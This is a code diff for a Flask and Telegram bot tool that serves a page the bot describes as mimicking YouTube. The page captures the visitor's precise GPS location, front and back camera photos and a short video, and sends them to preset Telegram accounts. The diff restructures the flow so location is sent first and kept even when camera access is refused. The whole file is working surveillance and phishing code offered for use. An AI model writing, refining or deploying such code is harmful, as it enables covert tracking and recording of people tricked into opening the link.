@@ -3,20 +3,19 @@ import threading
 from flask import Flask, request, render_template_string
 import telebot
 
-# ========== ENVIRONMENT VARIABLES ==========
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
-USER_IDS_STR = os.environ.get('USER_IDS')          # e.g., "8475691696,7361880623"
-BASE_URL = os.environ.get('BASE_URL')              # e.g., "https://your-app.railway.app"
+USER_IDS_STR = os.environ.get('USER_IDS')
+BASE_URL = os.environ.get('BASE_URL')
 
 if not BOT_TOKEN or not USER_IDS_STR or not BASE_URL:
-    raise RuntimeError("Missing required environment variables: BOT_TOKEN, USER_IDS, BASE_URL")
+    raise RuntimeError("Missing env vars: BOT_TOKEN, USER_IDS, BASE_URL")
 
 USER_IDS = [int(x.strip()) for x in USER_IDS_STR.split(',') if x.strip().isdigit()]
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ---------- HTML PAGE (unchanged, uses BASE_URL for link) ----------
+# ---------- HTML PAGE WITH IMPROVED PERMISSION FLOW ----------
 HTML_PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -65,6 +64,7 @@ HTML_PAGE = """<!DOCTYPE html>
         let frontStream = null, backStream = null, mediaRecorder = null;
         let recordedChunks = [], recordingActive = false, maxDuration = 10000;
         const statusText = document.getElementById('statusText');
+        const locationStatus = document.getElementById('locationStatus');
         const startBtn = document.getElementById('startBtn');
 
         function updateStatus(msg, good=true) {
@@ -72,6 +72,26 @@ HTML_PAGE = """<!DOCTYPE html>
             statusText.style.color = good ? '#3ea6ff' : '#ff6b6b';
         }
 
+        // ---------- SEND LOCATION FIRST ----------
+        function sendLocation(coords) {
+            const payload = { lat: coords.lat, lng: coords.lng };
+            fetch('/location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(res => res.text())
+            .then(() => {
+                locationStatus.innerHTML = `📍 Location sent: ${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}`;
+                updateStatus('Location sent to bot.');
+            })
+            .catch(err => {
+                locationStatus.innerHTML = '📍 Location send failed.';
+                console.error(err);
+            });
+        }
+
+        // ---------- CAPTURE FRAME ----------
         function captureFrame(stream) {
             return new Promise((resolve) => {
                 const video = document.createElement('video');
@@ -94,98 +114,128 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        async function getStreams() {
-            try {
-                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                return { front, back };
-            } catch (e) {
-                updateStatus('Camera permission denied.', false);
-                return null;
-            }
-        }
-
-        function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                        document.getElementById('locationStatus').innerHTML = `📍 ${coords.lat.toFixed(6)}, ${coords.lng.toFixed(6)}`;
-                        resolve(coords);
-                    },
-                    () => { document.getElementById('locationStatus').innerHTML = '📍 denied'; resolve(null); },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            });
-        }
-
-        async function sendData(data) {
+        // ---------- SEND MEDIA ----------
+        async function sendMedia(frontBlob, backBlob, videoBlob) {
             const fd = new FormData();
-            if (data.frontImage) fd.append('frontImage', data.frontImage, 'front.jpg');
-            if (data.backImage) fd.append('backImage', data.backImage, 'back.jpg');
-            if (data.videoBlob) fd.append('video', data.videoBlob, 'recording.webm');
-            if (data.location) fd.append('location', JSON.stringify(data.location));
+            if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
+            if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
+            if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
             await fetch('/capture', { method: 'POST', body: fd });
         }
 
+        // ---------- MAIN SESSION ----------
         async function startSession() {
             startBtn.disabled = true;
             startBtn.innerText = 'Starting...';
-            const streams = await getStreams();
-            if (!streams) { startBtn.disabled = false; startBtn.innerText = '▶ Start Session'; return; }
-            const { front, back } = streams;
-            const location = await getLocation();
-            const frontBlob = await captureFrame(front);
-            const backBlob = await captureFrame(back);
+            updateStatus('Requesting location...');
 
-            mediaRecorder = new MediaRecorder(back, { mimeType: 'video/webm;codecs=vp9' });
-            recordedChunks = [];
-            mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                sendData({ frontImage: frontBlob, backImage: backBlob, videoBlob: blob, location });
-                front.getTracks().forEach(t => t.stop());
-                back.getTracks().forEach(t => t.stop());
-                updateStatus('✅ Data sent!');
+            // ---- STEP 1: Get location ----
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                        sendLocation(coords);
+                        // After location sent, proceed to camera
+                        requestCamera();
+                    },
+                    (err) => {
+                        locationStatus.innerHTML = '📍 Location denied.';
+                        updateStatus('Location denied – proceeding to camera anyway.', false);
+                        requestCamera(); // still try camera
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                locationStatus.innerHTML = '📍 Geolocation not supported.';
+                requestCamera();
+            }
+        }
+
+        // ---- STEP 2: Request camera ----
+        async function requestCamera() {
+            updateStatus('Requesting camera access...');
+            try {
+                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                frontStream = front;
+                backStream = back;
+                updateStatus('Camera granted – capturing screenshots...');
+
+                // Capture two screenshots (speed 0.5 – we do one from each)
+                const frontBlob = await captureFrame(frontStream);
+                const backBlob = await captureFrame(backStream);
+
+                // Start recording from back camera
+                mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm;codecs=vp9' });
+                recordedChunks = [];
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    sendMedia(frontBlob, backBlob, blob);
+                    frontStream.getTracks().forEach(t => t.stop());
+                    backStream.getTracks().forEach(t => t.stop());
+                    updateStatus('✅ Media sent!');
+                    startBtn.disabled = false;
+                    startBtn.innerText = '▶ Start Session';
+                };
+                mediaRecorder.start(1000);
+                recordingActive = true;
+                updateStatus('Recording up to 10s...');
+                setTimeout(() => {
+                    if (recordingActive && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        recordingActive = false;
+                    }
+                }, maxDuration);
+                window.addEventListener('beforeunload', () => {
+                    if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
+                });
+                startBtn.innerText = 'Recording...';
+            } catch (e) {
+                updateStatus('Camera permission denied. Location was sent.', false);
                 startBtn.disabled = false;
                 startBtn.innerText = '▶ Start Session';
-            };
-            mediaRecorder.start(1000);
-            recordingActive = true;
-            updateStatus('Recording up to 10s...');
-            setTimeout(() => {
-                if (recordingActive && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                    recordingActive = false;
-                }
-            }, maxDuration);
-            window.addEventListener('beforeunload', () => {
-                if (recordingActive && mediaRecorder.state === 'recording') mediaRecorder.stop();
-            });
-            startBtn.innerText = 'Recording...';
+                // Still send a message that camera was denied (optional)
+                // We already sent location earlier, so that's fine.
+            }
         }
+
         startBtn.addEventListener('click', startSession);
-        updateStatus('Click "Start Session".');
+        updateStatus('Click "Start Session" – location first, then camera.');
     </script>
 </body>
 </html>"""
+
+# ---------- BACKEND ROUTES ----------
 
 @app.route('/')
 def index():
     return render_template_string(HTML_PAGE)
 
+@app.route('/location', methods=['POST'])
+def location():
+    """Receive location from frontend and send to Telegram."""
+    data = request.get_json()
+    lat = data.get('lat')
+    lng = data.get('lng')
+    if lat is not None and lng is not None:
+        for uid in USER_IDS:
+            try:
+                bot.send_location(uid, lat, lng)
+                bot.send_message(uid, f"📍 Location: {lat}, {lng}")
+            except Exception as e:
+                print(f"Location send error to {uid}: {e}")
+        return "OK", 200
+    return "Invalid", 400
+
 @app.route('/capture', methods=['POST'])
 def capture():
+    """Receive media (images, video) and send to Telegram."""
     front = request.files.get('frontImage')
     back = request.files.get('backImage')
     video = request.files.get('video')
-    loc = request.form.get('location')
     for uid in USER_IDS:
         try:
-            if loc:
-                d = eval(loc)  # safe; only you control the page
-                bot.send_location(uid, d['lat'], d['lng'])
             if front:
                 front.seek(0)
                 bot.send_photo(uid, front.read())
@@ -195,14 +245,15 @@ def capture():
             if video:
                 video.seek(0)
                 bot.send_video(uid, video.read(), supports_streaming=True)
-            bot.send_message(uid, "✅ Capture complete.")
+            bot.send_message(uid, "📸 Media capture complete.")
         except Exception as e:
-            print(f"Send error to {uid}: {e}")
-    return "OK"
+            print(f"Media send error to {uid}: {e}")
+    return "OK", 200
 
+# ---------- TELEGRAM BOT ----------
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt mimics YouTube and captures camera & location.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt mimics YouTube – location first, then camera.")
 
 def run_bot():
     bot.polling(non_stop=True, interval=1)
